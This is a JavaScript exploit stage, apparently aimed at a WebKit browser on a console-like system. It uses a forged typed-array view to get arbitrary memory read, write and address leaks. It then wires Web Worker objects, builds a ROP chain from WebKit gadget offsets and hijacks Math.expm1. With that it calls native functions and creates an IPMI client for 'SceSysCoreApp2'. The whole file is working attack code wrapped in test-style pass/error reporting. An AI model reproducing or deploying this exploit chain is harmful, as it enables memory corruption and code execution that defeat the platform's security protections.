return new Promise(function (resolve) {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14WorkerPlan;
  var mainPlan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  var worker = null;
  var workerUrl = null;
  var timer = null;
  var settled = false;
  var phase = "preflight";
  var restoreWorker = null;
  var heldMarker = null;
  var heartbeatTimer = null;
  var hangTimer = null;
  var beats = 0;
  var lastBeatAt = 0;
  function finish(status, details) {
    if (settled) return;
    settled = true;
    if (timer !== null) clearTimeout(timer);
    if (heartbeatTimer !== null) clearInterval(heartbeatTimer);
    if (hangTimer !== null) clearTimeout(hangTimer);
    if (restoreWorker) {
      try {
        details.worker_restored = restoreWorker();
        if (!details.worker_restored) status = "fail";
      } catch (error) {
        details.restore_error = String(error).slice(0, 180);
        status = "error";
      }
    }
    if (worker) worker.terminate();
    if (workerUrl) URL.revokeObjectURL(workerUrl);
    heldMarker = null;
    resolve([{ id: "worker_app2_discriminator_v2",
               status: status, details: details }]);
  }
  try {
    if (!state || !plan || !mainPlan || !native ||
        typeof native.call !== "function" ||
        !state.view || !state.array || !state.a ||
        !state.ownedTypedView || !state.calibratedViewBase ||
        state.array[0] !== state.a || !mainPlan.functionSlot ||
        !mainPlan.originalFunctionSlot || !plan.frame || !plan.stack ||
        !plan.addresses || !plan.addresses.store || !plan.addresses.frame ||
        !plan.target || !plan.webkitBase)
      throw new Error("held_view_missing");
    var forged = state.view;
    var a = state.ownedTypedView;
    var base = state.calibratedViewBase;
    if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
        !Number.isSafeInteger(base) || base % 4096 !== 0)
      throw new Error("held_view_canary_or_base_changed");
    function bytesAt(index) {
      var out = [];
      for (var i = 0; i < 8; i++) out.push(forged[index + i]);
      return out;
    }
    function integerOf(bytes) {
      var out = 0;
      for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
      return out;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(value) {
      try {
        state.array[0] = value;
        return integerOf(bytesAt(state.index));
      } finally {
        state.array[0] = state.a;
      }
    }
    var aIndex = addressOf(a) - base;
    var slot = aIndex + 8;
    if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
      throw new Error("owned_pointer_slot_outside_view");
    var original = bytesAt(slot);
    function readAt(address, length) {
      length = length || 24;
      if (length < 1 || length > 192)
        throw new Error("read_length_invalid");
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000)
        throw new Error("candidate_address_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        var out = [];
        for (var j = 0; j < length; j++) out.push(a[j]);
        return out;
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function writeAt(address, bytes) {
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000 || address % 8 !== 0 ||
          !bytes || bytes.length !== 8)
        throw new Error("write_target_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        for (var j = 0; j < 8; j++) a[j] = bytes[j];
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function same(left, right) {
      if (left.length !== right.length) return false;
      for (var i = 0; i < left.length; i++)
        if (left[i] !== right[i]) return false;
      return true;
    }
    function u32(bytes, at) {
      return (bytes[at] | (bytes[at + 1] << 8) |
              (bytes[at + 2] << 16) | (bytes[at + 3] << 24)) >>> 0;
    }
    function ptr(bytes, at) {
      return integerOf(bytes.slice(at, at + 8));
    }
    function validPointer(value) {
      return Number.isSafeInteger(value) && value >= 0x100000000 &&
             value < 0x1000000000000 && value % 8 === 0;
    }
    phase = "ipmi_measure";
    var infoFrame = native.frame;
    var infoAddress = native.frameAddress;
    if (infoFrame.length < 0x700 || infoAddress < 0x200000000 ||
        infoAddress >= 0x900000000)
      throw new Error("owned_frame_invalid");
    var infoOriginal = Array.from(infoFrame.subarray(0x300, 0x300 + 0x1a8));
    var infoDv = new DataView(infoFrame.buffer, infoFrame.byteOffset,
      infoFrame.byteLength);
    var ipmiBase = 0;
    try {
      infoFrame.fill(0, 0x300, 0x300 + 0x1a8);
      infoDv.setUint32(0x300, 0x1a8, true);
      infoDv.setUint32(0x304, 0, true);
      var info = native.call("dynlib_info_ex", [27, 0, infoAddress + 0x300]);
      if (info.value !== 0) throw new Error("ipmi_info_failed");
      var lo = infoDv.getUint32(0x300 + 0x110, true);
      var hi = infoDv.getUint32(0x300 + 0x114, true);
      ipmiBase = hi * 0x100000000 + lo;
    } finally {
      for (var ix = 0; ix < infoOriginal.length; ix++)
        infoFrame[0x300 + ix] = infoOriginal[ix];
    }
    if (ipmiBase < 0x800000000 || ipmiBase >= 0x900000000 ||
        ipmiBase % 4096 !== 0)
      throw new Error("ipmi_base_invalid");
    var ipmiRo = ipmiBase + 0xc000;
    var rawWrapper = ptr(readAt(ipmiRo + 0x488, 8), 0);
    if (!validPointer(rawWrapper)) throw new Error("raw_wrapper_invalid");
    var configInit = ipmiBase + 0x11b0;
    var clientCreate = ipmiBase + 0x1300;
    var configSig = [0xc5,0xf8,0x10,0x05,0x88,0x63,0x00,0x00,
      0x48,0xb8,0x00,0x00,0x00,0x00,0x01,0x00];
    var createSig = [0x55,0x48,0x89,0xe5,0x41,0x57,0x41,0x56,
      0x41,0x55,0x41,0x54,0x53,0x50,0x48,0x85];
    var rawSig = [0x48,0xc7,0xc0,0x6e,0x02,0x00,0x00,0x49,
      0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48];
    if (!same(readAt(ipmiBase, 8),
             [0x55,0x48,0x89,0xe5,0x41,0x57,0x41,0x56]) ||
        !same(readAt(configInit, 16), configSig) ||
        !same(readAt(clientCreate, 16), createSig) ||
        !same(readAt(rawWrapper, 16), rawSig))
      throw new Error("ipmi_signature_changed");
    var pidControl = native.call("getpid", []);
    var selfPid = pidControl.value;
    if (pidControl.high !== 0 || selfPid < 1 || selfPid > 100000)
      throw new Error("page_pid_control_invalid");
    if (api && typeof api.markSync === "function")
      api.markSync("app2_worker_preflight");
    phase = "worker_create";
    if (typeof Worker !== "function" || typeof Blob !== "function")
      throw new Error("worker_unavailable");
    var workerSource = [
      "var marker = new Uint32Array(new ArrayBuffer(0x10));",
      "var roots = [];",
      "var leak = null, master = null, victim = null, pivot = null;",
      "self.onmessage = function (event) {",
      "  if (event.data && event.data.name === 'ping') {",
      "    self.postMessage({ id: 0, type: 'ret', value: 'pong' });",
      "    return;",
      "  }",
      "  if (event.data && event.data.name === 'fire') {",
      "    self.postMessage({ id: 3, type: 'started', at: Date.now() });",
      "    Math.expm1(pivot);",
      "    self.postMessage({ id: 3, type: 'ret', value: true, at: Date.now() });",
      "    return;",
      "  }",
      "  if (event.data && event.data.name === 'function') {",
      "    master[4] = event.data.lo >>> 0;",
      "    master[5] = event.data.hi >>> 0;",
      "    var fnLo, fnHi;",
      "    leak.value = Math.expm1;",
      "    try {",
      "      fnLo = victim.getUint32(16, true);",
      "      fnHi = victim.getUint32(20, true);",
      "      pivot = {}; roots.push(pivot);",
      "      leak.value = pivot;",
      "      var pivotLo = victim.getUint32(16, true);",
      "      var pivotHi = victim.getUint32(20, true);",
      "    } finally { leak.value = null; }",
      "    master[4] = fnLo; master[5] = fnHi;",
      "    var m16Lo = victim.getUint32(16, true);",
      "    var m16Hi = victim.getUint32(20, true);",
      "    var m24Lo = victim.getUint32(24, true);",
      "    var m24Hi = victim.getUint32(28, true);",
      "    var normal = Math.abs(Math.expm1(1) - 1.718281828459045) < 1e-12;",
      "    self.postMessage({ id: 2, type: 'ret',",
      "      value: [fnLo, fnHi, pivotLo, pivotHi,",
      "              m16Lo, m16Hi, m24Lo, m24Hi, normal] });",
      "    return;",
      "  }",
      "  leak = { value: null };",
      "  master = new Uint32Array(6);",
      "  victim = new DataView(new ArrayBuffer(48));",
      "  marker[0] = 0x7a6b5c4d; marker[1] = 0x1234cafe;",
      "  marker[2] = 0x55aa33cc; marker[3] = 0xcc33aa55;",
      "  marker.leak = leak; marker.master = master; marker.victim = victim;",
      "  roots = [marker, leak, master, victim];",
      "  self.postMessage({ id: 1, type: 'ret', value: marker }, [marker.buffer]);",
      "};"
    ].join("\n");
    workerUrl = URL.createObjectURL(new Blob([workerSource],
                                        { type: "text/javascript" }));
    worker = new Worker(workerUrl);
    timer = setTimeout(function () {
      finish("error", { phase: "worker_reply", error: "timeout" });
    }, 28000);
    worker.onerror = function (event) {
      finish("error", { phase: "worker", error: String(event.message || "worker_error").slice(0, 180) });
    };
    var pingDone = false;
    var wired = false;
    var waitingForFunction = false;
    var masterTouched = false, victimTouched = false;
    var masterOrig = null, victimOrig = null;
    var masterAddr = 0, victimAddr = 0;
    var workerSlot = 0, workerPivot = 0;
    var workerSlotOriginal = null, workerPivotOriginal = null;
    var pendingFire = null;
    var waitingForConnect = false;
    var connectStartedAt = 0;
    var app2Kid = 0, createRet = 0, connectRet = 0;
    var connectReturned = false, connectHung = false;
    var configOffset = 0x600, outOffset = 0x500, storageOffset = 0x1000;
    var statusOffset = 0x780, status2Offset = 0x784;
    var resultOffset = 0x788, paramsOffset = 0x790;
    var pageFrame = mainPlan.frame;
    var pageFrameAddress = mainPlan.addresses.frame;
    var scratchOriginal = null;
    function put64(offset, value) {
      var dv = new DataView(pageFrame.buffer);
      dv.setUint32(offset, value >>> 0, true);
      dv.setUint32(offset + 4, Math.floor(value / 0x100000000) >>> 0, true);
    }
    function get32(offset) {
      return new DataView(pageFrame.buffer).getUint32(offset, true);
    }
    restoreWorker = function () {
      if (workerSlot && workerSlotOriginal)
        writeAt(workerSlot, workerSlotOriginal);
      if (workerPivot && workerPivotOriginal)
        writeAt(workerPivot, workerPivotOriginal);
      return (!workerSlot || same(readAt(workerSlot, 8), workerSlotOriginal)) &&
        (!workerPivot || same(readAt(workerPivot, 8), workerPivotOriginal)) &&
        a[0] === 0x31 && a[7] === 0xa8 &&
        same(bytesAt(slot), original) && state.array[0] === state.a;
    };
    function armWorkerCall(target, args) {
      var values = [];
      for (var ai = 0; ai < 6; ai++) {
        var value = ai < args.length ? args[ai] : 0;
        if (!Number.isSafeInteger(value) || value < 0 ||
            value >= 0x1000000000000)
          throw new Error("arg_invalid_" + ai);
        values.push(value);
      }
      var gadget = plan.webkitBase + 0x295f948;
      var code = readAt(gadget, 9);
      var expectedCode = [0x48,0x8b,0x7e,0x30,0x48,0x8b,0x07,0xff,0x10];
      if (!same(code, expectedCode))
        throw new Error("worker_gadget_changed");
      var chain = [plan.webkitBase + 0x5c480, values[0],
        plan.webkitBase + 0x6e45e, values[1],
        plan.webkitBase + 0x12c5ba, values[2],
        plan.webkitBase + 0x1bade, values[3],
        plan.webkitBase + 0x9b311, values[4],
        plan.webkitBase + 0x1dcfb1, values[5],
        target, plan.webkitBase + 0x5c480, plan.addresses.frame,
        plan.webkitBase + 0x548b, plan.webkitBase + 0x10504, null,
        plan.webkitBase + 0x182f7];
      var stackView = new DataView(plan.stack.buffer);
      var scratch = 0x1000;
      for (var c = 0; c < chain.length; c++) {
        if (c === 17) {
          stackView.setUint32(scratch + c * 8, 0x0a, true);
          stackView.setUint32(scratch + c * 8 + 4, 0xfffffff7, true);
        } else {
          stackView.setUint32(scratch + c * 8, chain[c] >>> 0, true);
          stackView.setUint32(scratch + c * 8 + 4,
            Math.floor(chain[c] / 0x100000000) >>> 0, true);
        }
      }
      for (var s = 0; s < 8; s++)
        plan.pivot[0x38 + s] =
          pointerBytes(plan.addresses.stack + scratch)[s];
      writeAt(workerSlot, pointerBytes(gadget));
      writeAt(workerPivot, pointerBytes(plan.addresses.store));
      if (!same(readAt(workerSlot, 8), pointerBytes(gadget)) ||
          !same(readAt(workerPivot, 8),
                pointerBytes(plan.addresses.store)))
        throw new Error("worker_arm_readback_failed");
    }
    function workerFire(op) {
      return new Promise(function (res, rej) {
        pendingFire = { op: op, res: res, rej: rej };
        worker.postMessage({ id: 3, name: "fire" });
      });
    }
    function startHeartbeat() {
      heartbeatTimer = setInterval(function () {
        if (settled) return;
        try {
          beats++;
          lastBeatAt = Date.now();
          if (api && typeof api.mark === "function")
            api.mark("app2_heartbeat_" + beats).catch(function () {});
          var beat = native.call("getpid", []);
          if (beat.high !== 0 || beat.value !== selfPid)
            throw new Error("heartbeat_pid_changed");
        } catch (error) {
          if (heartbeatTimer !== null) clearInterval(heartbeatTimer);
          finish("error", { phase: "heartbeat",
            error: String(error).slice(0, 180) });
        }
      }, 2000);
    }
    worker.onmessage = function (event) {
      if (settled) return;
      try {
        if (!pingDone) {
          if (!event.data || event.data.id !== 0 ||
              event.data.value !== "pong")
            throw new Error("worker_ping_mismatch");
          pingDone = true;
          worker.postMessage({ id: 1, name: "init", args: [] });
          return;
        }
        if (pendingFire && event.data && event.data.id === 3) {
          if (event.data.type === "started") {
            if (pendingFire.op === "connect") {
              connectStartedAt = event.data.at;
              if (api && typeof api.markSync === "function")
                api.markSync("app2_worker_before_connect");
            }
            return;
          }
          if (event.data.type === "ret" && event.data.value === true) {
            var done = pendingFire;
            pendingFire = null;
            done.res(true);
            return;
          }
        }
        if (!wired) {
          phase = "transferred_marker";
          var typed = event.data && event.data.type === "ret" &&
            event.data.id === 1 && event.data.value;
          var markersOk = typed instanceof Uint32Array && typed.length === 4 &&
            typed[0] === 0x7a6b5c4d && typed[1] === 0x1234cafe &&
            typed[2] === 0x55aa33cc && typed[3] === 0xcc33aa55;
          if (!markersOk) throw new Error("transferred_marker_mismatch");
          heldMarker = typed;
          phase = "buffer_cell";
          var cell = addressOf(typed.buffer);
          if (!validPointer(cell)) throw new Error("buffer_cell_invalid");
          var cellBytes = readAt(cell, 32);
          var impl = ptr(cellBytes, 0x10);
          if (!validPointer(impl)) throw new Error("buffer_impl_invalid");
          phase = "buffer_impl";
          var implBytes = readAt(impl, 32);
          var data = ptr(implBytes, 0x10);
          if (!validPointer(data)) throw new Error("buffer_data_invalid");
          phase = "worker_backing";
          var backing = readAt(data, 32);
          var backingOk = u32(backing, 0) === 0x7a6b5c4d &&
            u32(backing, 4) === 0x1234cafe &&
            u32(backing, 8) === 0x55aa33cc &&
            u32(backing, 12) === 0xcc33aa55;
          if (!backingOk) throw new Error("worker_backing_mismatch");
          phase = "storage_chain";
          var storage = ptr(backing, 0x10);
          if (!validPointer(storage)) throw new Error("storage_pointer_invalid");
          var message = ptr(readAt(storage, 8), 0);
          if (!validPointer(message)) throw new Error("message_pointer_invalid");
          var messageBytes = readAt(message, 0x40);
          var messageHex = "";
          for (var mh = 0; mh < 0x20; mh++)
            messageHex += ("0" + messageBytes[mh].toString(16)).slice(-2);
          var butterflyCandidates = [];
          for (var bo = 0; bo < 0x40; bo += 8) {
            var messageField = ptr(messageBytes, bo);
            if (validPointer(messageField) && messageField >= 0x100000018)
              butterflyCandidates.push({ value: messageField, offset: bo });
          }
          if (!butterflyCandidates.length)
            throw new Error("butterfly_pointer_invalid:m" + messageHex);
          phase = "worker_references";
          var master = 0, victim = 0, leak = 0;
          var butterfly = 0, butterflyOffset = -1;
          for (var bc = 0; bc < butterflyCandidates.length; bc++) {
            var bf = butterflyCandidates[bc].value;
            var m = 0, v = 0, l = 0;
            for (var index = 1; index <= 8; index++) {
              var candidate = ptr(readAt(bf - index * 8, 8), 0);
              if (!validPointer(candidate) ||
                  Math.abs(candidate - cell) >= 0x40000000) continue;
              var candidateBytes = readAt(candidate, 32);
              var wlength = u32(candidateBytes, 24);
              var inline = ptr(candidateBytes, 16);
              if (!m && wlength === 6 && validPointer(inline)) {
                m = candidate;
              } else if (!v && wlength === 48 && validPointer(inline)) {
                v = candidate;
              } else if (!l && u32(candidateBytes, 16) === 2 &&
                         u32(candidateBytes, 20) === 0) {
                l = candidate;
              }
            }
            if (m && v && l && m !== v && m !== l && v !== l) {
              master = m; victim = v; leak = l;
              butterfly = bf;
              butterflyOffset = butterflyCandidates[bc].offset;
              break;
            }
          }
          if (!master || !victim || !leak)
            throw new Error("worker_shapes_missing:m" + messageHex +
              ":b" + butterflyCandidates.length);
          phase = "wire_worker";
          var masterOriginal = readAt(master + 16, 8);
          var victimOriginal = readAt(victim + 16, 8);
          if (!validPointer(ptr(masterOriginal, 0)) ||
              !validPointer(ptr(victimOriginal, 0)))
            throw new Error("worker_vectors_invalid");
          if (!same(readAt(mainPlan.functionSlot, 8),
                    mainPlan.originalFunctionSlot))
            throw new Error("main_function_slot_changed");
          masterAddr = master; victimAddr = victim;
          masterOrig = masterOriginal; victimOrig = victimOriginal;
          masterTouched = true;
          writeAt(master + 16, pointerBytes(victim));
          if (ptr(readAt(master + 16, 8), 0) !== victim)
            throw new Error("worker_master_wire_failed");
          victimTouched = true;
          waitingForFunction = true;
          worker.postMessage({ id: 2, name: "function", lo: leak >>> 0,
                               hi: Math.floor(leak / 0x100000000) >>> 0 });
          return;
        }
        if (waitingForFunction) {
          phase = "worker_wire";
          var reply = event.data;
          var words = reply && reply.id === 2 &&
            reply.type === "ret" && reply.value;
          if (!Array.isArray(words) || words.length !== 9)
            throw new Error("worker_function_reply_invalid");
          var fn = words[0] + words[1] * 0x100000000;
          var pivot = words[2] + words[3] * 0x100000000;
          var m16 = words[4] + words[5] * 0x100000000;
          var m24 = words[6] + words[7] * 0x100000000;
          if (!validPointer(fn) || !validPointer(pivot) ||
              !validPointer(m16) || !validPointer(m24))
            throw new Error("worker_function_pointers_invalid");
          var slot16 = m16 + 40;
          var slot24 = m24 + 40;
          var match16 = same(readAt(slot16, 8), mainPlan.originalFunctionSlot);
          var match24 = same(readAt(slot24, 8), mainPlan.originalFunctionSlot);
          if (Number(match16) + Number(match24) !== 1)
            throw new Error("worker_call_target_preflight_failed");
          workerSlot = match16 ? slot16 : slot24;
          workerPivot = pivot;
          workerSlotOriginal = readAt(workerSlot, 8);
          workerPivotOriginal = readAt(workerPivot, 8);
          wired = true;
          waitingForFunction = false;
          restoreWorker = function () {
            if (victimTouched) writeAt(victimAddr + 16, victimOrig);
            if (masterTouched) writeAt(masterAddr + 16, masterOrig);
            if (workerSlot && workerSlotOriginal)
              writeAt(workerSlot, workerSlotOriginal);
            if (workerPivot && workerPivotOriginal)
              writeAt(workerPivot, workerPivotOriginal);
            return (!victimTouched ||
                    same(readAt(victimAddr + 16, 8), victimOrig)) &&
              (!masterTouched ||
               same(readAt(masterAddr + 16, 8), masterOrig)) &&
              (!workerSlot ||
               same(readAt(workerSlot, 8), workerSlotOriginal)) &&
              (!workerPivot ||
               same(readAt(workerPivot, 8), workerPivotOriginal)) &&
              a[0] === 0x31 && a[7] === 0xa8 &&
              same(bytesAt(slot), original) && state.array[0] === state.a;
          };
          phase = "app2_create";
          scratchOriginal = Array.from(pageFrame.subarray(outOffset,
            storageOffset + 0x1000));
          pageFrame.fill(0, outOffset, storageOffset + 0x1000);
          armWorkerCall(configInit, [pageFrameAddress + configOffset]);
          var configName = "SceSysCoreApp2";
          for (var ni = 0; ni < configName.length; ni++)
            pageFrame[configOffset + ni] = configName.charCodeAt(ni);
          pageFrame[configOffset + configName.length] = 0;
          workerFire("config").then(function () {
            if (settled) return;
            armWorkerCall(clientCreate,
              [pageFrameAddress + outOffset,
               pageFrameAddress + configOffset, 0,
               pageFrameAddress + storageOffset]);
            return workerFire("create");
          }).then(function () {
            if (settled) return;
            var frameView = new DataView(plan.frame.buffer);
            createRet = frameView.getInt32(0, true);
            if (createRet !== 0)
              throw new Error("app2_create_failed_" + createRet);
            app2Kid = get32(storageOffset + 8);
            var objectVtable = ptr(readAt(pageFrameAddress + storageOffset, 8), 0);
            if (objectVtable !== ipmiBase + 0xc010)
              throw new Error("app2_client_vtable_changed");
            if (api && typeof api.markSync === "function")
              api.markSync("app2_worker_created");
            phase = "app2_connect";
            put64(statusOffset, 0);
            put64(status2Offset, 0);
            put64(paramsOffset + 0x00, 0);
            put64(paramsOffset + 0x08, 0);
            put64(paramsOffset + 0x10, pageFrameAddress + statusOffset);
            put64(paramsOffset + 0x18, pageFrameAddress + status2Offset);
            startHeartbeat();
            if (api && typeof api.markSync === "function")
              api.markSync("app2_worker_connect_armed");
            armWorkerCall(rawWrapper,
              [0x400, app2Kid, pageFrameAddress + resultOffset,
               pageFrameAddress + paramsOffset, 0x20, 0]);
            waitingForConnect = true;
            hangTimer = setTimeout(function () {
              if (settled) return;
              connectHung = true;
              waitingForConnect = false;
              if (heartbeatTimer !== null) clearInterval(heartbeatTimer);
              for (var fi = 0; fi < scratchOriginal.length; fi++)
                pageFrame[outOffset + fi] = scratchOriginal[fi];
              var after = native.call("getpid", []);
              finish("pass",
                { self_pid: after.value, ipmi_base: ipmiBase,
                  app2_kid: app2Kid, create_ret: createRet,
                  connect_returned: false, connect_ret: 0,
                  connect_hung: true, beats: beats,
                  butterfly_offset: butterflyOffset,
                  butterfly_candidates: butterflyCandidates.length,
                  restored: after.value === selfPid && after.high === 0 });
            }, 20000);
            return workerFire("connect");
          }).then(function () {
            if (settled) return;
            waitingForConnect = false;
            connectReturned = true;
            if (hangTimer !== null) clearTimeout(hangTimer);
            if (heartbeatTimer !== null) clearInterval(heartbeatTimer);
            var frameView = new DataView(plan.frame.buffer);
            connectRet = frameView.getInt32(0, true);
            if (api && typeof api.markSync === "function")
              api.markSync("app2_worker_connected");
            try {
              put64(paramsOffset + 0x00, pageFrameAddress + statusOffset);
              put64(statusOffset, 0);
              armWorkerCall(rawWrapper,
                [0x310, app2Kid, pageFrameAddress + paramsOffset, 8, 0, 0]);
              return workerFire("disconnect");
            } catch (cleanupError) {
              return true;
            }
          }).then(function () {
            if (settled) return;
            try {
              armWorkerCall(rawWrapper, [3, app2Kid, 0, 0, 0, 0]);
              return workerFire("destroy");
            } catch (cleanupError) {
              return true;
            }
          }).then(function () {
            if (settled) return;
            for (var fi = 0; fi < scratchOriginal.length; fi++)
              pageFrame[outOffset + fi] = scratchOriginal[fi];
            var after = native.call("getpid", []);
            if (api && typeof api.markSync === "function")
              api.markSync("app2_worker_restored");
            finish("pass",
              { self_pid: after.value, ipmi_base: ipmiBase,
                app2_kid: app2Kid, create_ret: createRet,
                connect_returned: true, connect_ret: connectRet,
                connect_hung: false, beats: beats,
                butterfly_offset: butterflyOffset,
                butterfly_candidates: butterflyCandidates.length,
                restored: after.value === selfPid && after.high === 0 });
          }).catch(function (error) {
            if (!settled)
              finish("error", { phase: phase,
                error: String(error && error.message || error).slice(0, 180) });
          });
          return;
        }
        throw new Error("unexpected_worker_message");
      } catch (error) {
        finish("error", { phase: phase, error: String(error).slice(0, 180) });
      }
    };
    worker.postMessage({ id: 0, name: "ping", args: [] });
  } catch (error) {
    finish("error", { phase: phase, error: String(error).slice(0, 180) });
  }
});
